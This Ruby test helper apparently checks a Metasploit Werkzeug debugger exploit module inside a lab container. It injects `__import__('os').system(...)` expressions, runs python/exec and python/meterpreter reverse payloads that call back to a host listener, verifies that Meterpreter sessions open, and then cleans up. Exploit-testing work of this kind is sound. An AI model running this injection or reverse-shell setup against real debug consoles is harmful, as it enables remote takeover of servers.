# frozen_string_literal: true

require 'English'
require 'shellwords'
require_relative '../rsync_creds/native'

# Native interpreter, real authentication and physical session lifecycle gates.
module WerkzeugTarget
  include RsyncCredentialTarget

  def rc_save
    File.write(File.join(target_runtime.fetch('artifacts'), 'werkzeug-owner.json'), JSON.pretty_generate(@rc)) if @rc
  end

  def rc_resource_roles
    ['target']
  end

  def wk_prepare
    @rc = { commands: [], native: [], calls: [], states: [], controls: [], sessions: [], selections: [], native_payloads: [] }
    @metadata = wk_native('metadata', 'metadata')
    @target = { '3.0.3' => 0, '1.0.1' => 1, '0.11.5' => 2, '0.10' => 3 }.fetch(@metadata.fetch('version'))
    @auth = @metadata['pin'] ? 'generated-cookie' : 'none'
    @baseline = rc_poll do
      value = wk_state('baseline')
      value if value.fetch('processes').map { |row| row.fetch('pid') }.sort == [1, @metadata.fetch('pid')].sort && wk_comparable(value).fetch('connections').empty?
    end
    expect(@baseline.fetch('tmp')).to eq({})
    rc_resources('before')
    @rc[:observer] = rc_json("begin;load 'test/module_targets/werkzeug/observe.rb';WerkzeugObservation.install(framework,#{target_runtime.fetch('artifacts').inspect});end")
  end

  def wk_native(label, mode, *)
    output, = rc_command(label, 'target', 'python', '-B', '/opt/module-target-werkzeug/native_probe.py', mode, *)
    value = JSON.parse(output)
    @rc[:native] << { label: label, mode: mode, value: value }
    rc_save
    value
  end

  def wk_execute(label, data)
    value = wk_native(label, 'execute', Base64.strict_encode64(JSON.generate(data)))
    @rc[:controls] << { label: label, data: data, result: value }
    rc_save
    value
  end

  def wk_comparable(value)
    copy = Marshal.load(Marshal.dump(value))
    copy.fetch('processes').each { |process| process.delete('state') }
    copy.fetch('connections').reject! { |row| row.values_at('state', 'inode') == %w[06 0] }
    copy
  end

  def wk_state(label)
    value = wk_native(label, 'state')
    @rc[:states] << { label: label, value: value }
    rc_save
    value
  end

  def wk_preserved
    rc_poll do
      value = wk_state('preserved')
      value if wk_comparable(value) == wk_comparable(@baseline)
    end
    expect(rc_json('framework.sessions.keys')).to eq([])
    expect(rc_json('framework.jobs.keys')).to eq([])
    rc_resources('preserved')
  end

  def wk_entry(entry)
    case entry
    when :console then { 'TARGETURI' => '/console', 'METHOD' => 'GET' }
    when :get then { 'TARGETURI' => '/trigger?file=raise', 'METHOD' => 'GET' }
    when :post then { 'TARGETURI' => '/trigger', 'METHOD' => 'POST', 'REQUESTBODY' => 'file=raise' }
    else raise ArgumentError, entry.inspect
    end
  end

  def wk_discovery(entry)
    case entry
    when :console then { entry: '/console' }
    when :get then { entry: '/trigger?file=raise' }
    when :post then { entry: '/trigger', method: 'POST', body: 'file=raise' }
    else raise ArgumentError, entry.inspect
    end
  end

  def wk_options(auth, entry: :console)
    {
      'TARGET' => @target, 'AUTHMODE' => auth, 'SSL' => false, 'VHOST' => 'localhost',
      'SERVICEUSER' => @metadata.fetch('username'), 'MODULENAME' => @metadata.fetch('module_name'),
      'APPNAME' => @metadata.fetch('app_name'), 'FLASKPATH' => @metadata.fetch('module_file'),
      'MACADDRESS' => @metadata.fetch('mac'), 'MACHINEID' => @metadata.fetch('machine_id'),
      'CGROUP' => @metadata.fetch('cgroup'), 'PIN' => @metadata['pin'], 'COOKIE' => @rc[:native_cookie],
      'HttpClientTimeout' => 12
    }.merge(wk_entry(entry)).compact
  end

  def wk_select(cold: false)
    console_command('unset PAYLOAD') if cold
    console_command('back')
    console_command('use ' + WerkzeugObservation::OWNER)
    value = rc_json('{object:active_module.object_id,payload:active_module.datastore["PAYLOAD"],target:active_module.target_index}')
    @rc[:selections] << value
    rc_save
    value
  end

  def wk_call(label, options, action: 'run -z')
    offset = rc_json('framework.instance_variable_get(:@werkzeug_events).length')
    call = { label: label, options: options, action: action }
    @rc[:calls] << call
    output = run_target_module(WerkzeugObservation::OWNER, 'target', options, action: action, reuse_module: true, allow_errors: true, command_timeout: 80)
    call.merge!(output_base64: Base64.strict_encode64(output.b), events: rc_json("framework.instance_variable_get(:@werkzeug_events).drop(#{offset})"), selection: rc_json('active_module.object_id'))
    rc_save
    call
  end

  def wk_native_command(command, path, content, entry, stock: true)
    expect(wk_native('native-proof-absent', 'file', path)).to eq('exists' => false)
    wk_execute('native-command', { expression: "__import__('os').system(#{command.inspect})" }.merge(wk_discovery(entry)))
    expect(wk_native('native-command-proof', 'file', path)).to include('uid' => 1001, 'base64' => Base64.strict_encode64(content.b))
    if stock
      wk_native('native-direct-remove', 'remove', path)
      program = rc_json("begin;producer=framework.payloads.create('python/exec');producer.datastore['CMD']=#{command.inspect};Base64.strict_encode64(producer.generate);end")
      wk_execute('native-stock-python-exec', { expression: Base64.strict_decode64(program) }.merge(wk_discovery(entry)))
      actual = rc_poll(8) do
        value = wk_native('native-stock-proof', 'file', path)
        value if value['base64'] == Base64.strict_encode64(content.b)
      end
      expect(actual.fetch('uid')).to eq(1001)
    end
  ensure
    wk_native('native-command-remove', 'remove', path)
  end

  def wk_command(auth, label, content, entry: :console)
    selected = wk_select
    2.times do |iteration|
      path = "/tmp/module-target-werkzeug-owner-#{label}-#{iteration}"
      command = 'printf %s ' + Shellwords.escape(content) + ' >> ' + path
      wk_native_command(command, path, content, entry)
      console_command('set PAYLOAD python/exec')
      rc_json("begin;active_module.datastore['CMD']=#{command.inspect};true;end")
      call = wk_call(label, wk_options(auth, entry: entry).merge('PAYLOAD' => 'python/exec', 'DisablePayloadHandler' => true, 'AutoCheck' => iteration.zero?))
      expect(call.fetch(:selection)).to eq(selected.fetch('object'))
      expect(Base64.strict_decode64(call.fetch(:output_base64))).not_to include('Exploit failed', 'Exploit aborted')
      actual = rc_poll(8) do
        value = wk_native('owner-command-proof', 'file', path)
        value if value['base64'] == Base64.strict_encode64(content.b)
      end
      expect(actual.fetch('uid')).to eq(1001)
    ensure
      primary = $ERROR_INFO
      begin
        wk_native('owner-command-remove', 'remove', path)
        wk_preserved
      rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
        (@rc[:cleanup_errors] ||= []) << { type: e.class.name, message: e.message }
        raise unless primary
      ensure
        rc_save
      end
    end
  end

  def wk_session_record(label)
    row = rc_poll(45) do
      rows = rc_json('framework.sessions.map{|id,s|{id:id,type:s.type,platform:s.platform,stdapi:!!(s.respond_to?(:sys)&&s.sys&&s.sys.process)}}')
      ready = console.all_data.scan(/Meterpreter session (\d+) opened/).flatten.map(&:to_i)
      rows.find { |entry| entry['stdapi'] && ready.include?(entry.fetch('id')) }
    end
    @session = row.fetch('id')
    @session_path = "/tmp/module-target-werkzeug-session-#{Process.pid}-#{@session}"
    proof = rc_json("LaravelSessionControl.proof(framework,#{@session},#{@session_path.inspect},'werkzeug-proof',false,component:'werkzeug')")
    physical = wk_native('session-physical-process', 'process', proof.fetch('pid').to_s)
    record = { label: label, session: row, proof: proof, physical_process: physical }
    @rc[:sessions] << record
    rc_save
    expect(row.fetch('type')).to eq('meterpreter')
    expect(physical).to include('uid' => 1001, 'pid' => proof.fetch('pid'))
    expect(physical.fetch('pid')).not_to eq(@metadata.fetch('pid'))
    expect(wk_native('session-exact-proof', 'file', @session_path)).to include('uid' => 1001, 'base64' => Base64.strict_encode64('werkzeug-proof'))
    record
  end

  def wk_close_session
    return unless @session

    record = @rc.fetch(:sessions).last
    record[:shutdown] = rc_json("LaravelSessionControl.shutdown(framework,#{@session},component:'werkzeug')")
    rc_poll do
      _, code = rc_command('session-pid-absent', 'target', 'test', '!', '-e', '/proc/' + record.fetch(:proof).fetch('pid').to_s, required: false)
      code.zero?
    end
    console_command("sessions -k #{@session}") if rc_json('framework.sessions.keys').include?(@session)
    rc_poll { !rc_json('framework.sessions.keys').include?(@session) }
    wk_native('session-proof-remove', 'remove', @session_path)
    @session = nil
    rc_save
  end

  def wk_sessions
    selected = wk_select(cold: true)
    payload = selected.fetch('payload')
    @rc[:cold_default] = selected
    expect(payload).to start_with('python/meterpreter')
    output, = rc_command('callback-host', 'target', 'getent', 'ahostsv4', 'host.docker.internal')
    host = output.split.first
    rc_json("begin;load 'test/module_targets/laravel/session_control.rb';load 'test/module_targets/werkzeug/session_control.rb';true;end")
    2.times do |iteration|
      socket = TCPServer.new('0.0.0.0', 0)
      port = socket.local_address.ip_port
      socket.close
      # First qualify the actual stock payload through the genuine debugger,
      # with a separate real handler and no exploit-owner implementation.
      generated = rc_json("WerkzeugSessionControl.start_native(framework,active_module.user_input,active_module.user_output,#{payload.inspect},#{host.inspect},#{port})")
      expect(generated.values_at('payload', 'fork')).to eq([payload, true])
      @rc[:native_payloads] << generated
      wk_execute('native-default-payload', expression: Base64.strict_decode64(generated.fetch('program_base64')), isolated: true)
      wk_session_record('native-default-' + iteration.to_s)
      wk_close_session
      console_command('jobs -K')
      wk_preserved
      call = wk_call('owner-default-' + iteration.to_s, wk_options(@auth).merge('LHOST' => host, 'LPORT' => port, 'ReverseListenerBindAddress' => '0.0.0.0', 'AutoCheck' => iteration.zero?))
      expect(call.fetch(:selection)).to eq(selected.fetch('object'))
      record = wk_session_record('owner-default-' + iteration.to_s)
      record[:owner_call] = call
      wk_close_session
      expect(Base64.strict_decode64(call.fetch(:output_base64))).not_to include('Exploit failed', 'Exploit aborted')
      wk_preserved
    ensure
      primary = $ERROR_INFO
      begin
        wk_close_session if @session
        console_command('jobs -K')
        wk_preserved
      rescue RSpec::Expectations::ExpectationNotMetError, StandardError => e
        (@rc[:cleanup_errors] ||= []) << { type: e.class.name, message: e.message }
        raise unless primary
      ensure
        rc_save
      end
    end
  end
end
